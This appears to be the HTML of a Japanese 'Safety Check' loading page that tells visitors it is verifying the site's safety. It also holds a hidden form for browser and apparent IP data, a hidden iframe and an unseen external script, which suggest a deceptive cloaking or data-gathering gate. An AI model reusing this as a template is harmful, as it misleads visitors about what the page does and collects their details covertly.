
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Safety Check: ウェブサイトの安全性を検証する画期的なサービス</title>
  <link rel="icon" href="/favicon3.svg">
  <script src="script.js"></script>

  <style>
    :root {
      --bg: #0f172a;
      --fg: #e2e8f0;
      --accent: #3b82f6;
    }

    body {
      margin: 0;
      height: 100vh;
      display: grid;
      place-items: center;
      background: radial-gradient(circle at center, #1e293b, var(--bg));
      color: var(--fg);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      overflow: hidden;
    }

    .container {
      text-align: center;
    }

    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid rgba(255,255,255,0.1);
      border-top: 4px solid var(--accent);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 16px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .text {
      font-size: 14px;
      opacity: 0.8;
    }

    .sub {
      margin-top: 8px;
      font-size: 12px;
      opacity: 0.5;
      min-height: 32px;
    }

    /* スライドイン用 */
    .slide-in {
      display: inline-block;
      opacity: 0;
      transform: translateY(12px);
      animation: slideIn 0.5s ease forwards;
    }

    @keyframes slideIn {
      from {
        opacity: 0;
        transform: translateY(12px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="spinner"></div>

    <div class="text">アクセス検証中…</div>

    <div class="sub" id="subText">
      <span class="slide-in">サイトが安全か確かめています</span>
    </div>
  </div>

  <form method="get" action="">
    <input id="bro" name="browser" hidden>
    <input id="act" name="act" hidden>
    <input id="ipa" name="ipa" hidden>
    <input id="use" name="use" hidden>
  </form>

  <iframe style="display: none;"></iframe>

  <script>
    setTimeout(() => {
      const sub = document.getElementById('subText');

      const extra = document.createElement('div');
      extra.className = 'slide-in';
      extra.style.marginTop = '6px';
      extra.textContent = 'この動作には数十秒かかることがあります...';

      sub.appendChild(extra);
    }, 2000);
  </script>

</body>
</html>
